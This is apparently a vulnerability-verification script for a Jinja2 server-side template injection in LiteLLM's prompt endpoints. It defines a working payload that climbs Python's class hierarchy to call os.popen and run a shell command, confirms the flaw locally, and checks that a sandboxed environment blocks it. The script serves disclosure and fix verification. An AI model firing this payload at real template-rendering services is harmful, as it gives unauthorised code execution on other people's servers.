#!/usr/bin/env python3
"""
Verification script: LiteLLM SSTI → RCE via /prompts/test
Researcher: Rodion Goroshev | 2026-03-23

Reproduces the exact Jinja2 environment used by LiteLLM v1.82.6 and
confirms both the vulnerable behaviour and that the proposed fix blocks it.

Requirements: pip install jinja2
No running LiteLLM instance needed — tests the root cause directly.

Exit codes:
  0 — vulnerability confirmed (server IS vulnerable)
  1 — environment error (jinja2 not installed)
"""

import sys
import subprocess

BOLD  = "\033[1m"
RED   = "\033[91m"
GREEN = "\033[92m"
CYAN  = "\033[96m"
RESET = "\033[0m"

def banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════╗
║  LiteLLM SSTI → RCE  |  /prompts/test  |  v1.82.6        ║
║  CVE candidate — distinct from CVE-2024-2952              ║
╚══════════════════════════════════════════════════════════╝{RESET}
""")

def check_deps():
    try:
        import jinja2
        return jinja2
    except ImportError:
        print(f"{RED}[-] jinja2 not installed. Run: pip install jinja2{RESET}")
        sys.exit(1)

def make_vulnerable_env(jinja2):
    """Exact environment from litellm/integrations/dotprompt/prompt_manager.py:62"""
    from jinja2 import DictLoader, Environment, select_autoescape
    return Environment(
        loader=DictLoader({}),
        autoescape=select_autoescape(["html", "xml"]),
        variable_start_string="{{",
        variable_end_string="}}",
        block_start_string="{%",
        block_end_string="%}",
        comment_start_string="{#",
        comment_end_string="#}",
    )

def make_fixed_env():
    """Fixed version using ImmutableSandboxedEnvironment"""
    from jinja2 import DictLoader, select_autoescape
    from jinja2.sandbox import ImmutableSandboxedEnvironment
    return ImmutableSandboxedEnvironment(
        loader=DictLoader({}),
        autoescape=select_autoescape(["html", "xml"]),
        variable_start_string="{{",
        variable_end_string="}}",
        block_start_string="{%",
        block_end_string="%}",
        comment_start_string="{#",
        comment_end_string="#}",
    )

# ──────────────────────────────────────────────────────────
# Payloads
# ──────────────────────────────────────────────────────────

PAYLOAD_ARITHMETIC = "{{ 7*7 }}"

PAYLOAD_RCE = (
    "{% set ns = namespace(cls=none) %}"
    "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
    "{% if c.__name__ == 'catch_warnings' %}"
    "{% set ns.cls = c %}"
    "{% endif %}{% endfor %}"
    "{{ ns.cls.__init__.__globals__['__builtins__']['__import__']('os')"
    ".popen('id').read() }}"
)


def test_arithmetic(env):
    """Step 1: confirm Jinja2 evaluates expressions (not just variable substitution)."""
    result = env.from_string(PAYLOAD_ARITHMETIC).render()
    return result.strip() == "49"


def test_rce(env):
    """Step 2: confirm OS command execution via Python object model traversal."""
    try:
        result = env.from_string(PAYLOAD_RCE).render().strip()
        # Confirm the output looks like `id` command output
        return ("uid=" in result), result
    except Exception as e:
        return False, str(e)


def test_fix_blocks_rce():
    """Step 3: confirm ImmutableSandboxedEnvironment blocks the same payload."""
    env = make_fixed_env()
    try:
        result = env.from_string(PAYLOAD_RCE).render().strip()
        # Sandbox should produce empty/safe output or raise SecurityError
        if "uid=" in result:
            return False, result   # still vulnerable
        return True, result or "(empty — sandbox blocked evaluation)"
    except Exception as e:
        # SecurityError or similar = sandbox working correctly
        return True, f"Blocked with exception: {type(e).__name__}: {e}"


# ──────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────

def main():
    banner()
    jinja2 = check_deps()
    env = make_vulnerable_env(jinja2)

    print(f"{BOLD}[1/3] Arithmetic evaluation check{RESET}")
    print(f"      Payload : {PAYLOAD_ARITHMETIC}")
    if test_arithmetic(env):
        print(f"      Result  : {GREEN}49 ✓  — Jinja2 executes template expressions{RESET}\n")
    else:
        print(f"      Result  : {RED}UNEXPECTED — template not executing{RESET}\n")
        sys.exit(1)

    print(f"{BOLD}[2/3] Remote Code Execution — vulnerable environment{RESET}")
    print(f"      Source  : litellm/integrations/dotprompt/prompt_manager.py:62")
    print(f"      Pivot   : warnings.catch_warnings.__init__.__globals__['__builtins__']")
    print(f"      Command : id")
    rce_ok, rce_output = test_rce(env)
    if rce_ok:
        print(f"      Output  : {RED}{BOLD}{rce_output}{RESET}")
        print(f"      Status  : {RED}[VULNERABLE] RCE confirmed ✗{RESET}\n")
    else:
        print(f"      Output  : {rce_output}")
        print(f"      Status  : {GREEN}payload did not execute (environment may already be patched){RESET}\n")

    print(f"{BOLD}[3/3] Fix verification — ImmutableSandboxedEnvironment{RESET}")
    print(f"      Same payload, sandboxed environment")
    fix_ok, fix_output = test_fix_blocks_rce()
    if fix_ok:
        print(f"      Output  : {fix_output}")
        print(f"      Status  : {GREEN}[FIXED] Sandbox blocks the payload ✓{RESET}\n")
    else:
        print(f"      Output  : {RED}{fix_output}{RESET}")
        print(f"      Status  : {RED}[FIX FAILED] Sandbox did not block — report to researcher{RESET}\n")

    print("─" * 60)
    if rce_ok:
        print(f"{RED}{BOLD}RESULT: VULNERABLE — RCE via Jinja2 SSTI confirmed{RESET}")
        print(f"Fix   : replace Environment with ImmutableSandboxedEnvironment")
        print(f"Files : litellm/integrations/dotprompt/prompt_manager.py:62")
        print(f"        litellm/integrations/gitlab/gitlab_prompt_manager.py:93")
        print(f"        litellm/integrations/arize/arize_phoenix_prompt_manager.py:77")
        print(f"        litellm/integrations/bitbucket/bitbucket_prompt_manager.py:77")
        sys.exit(0)
    else:
        print(f"{GREEN}RESULT: Not reproduced in this environment{RESET}")
        sys.exit(0)


if __name__ == "__main__":
    main()
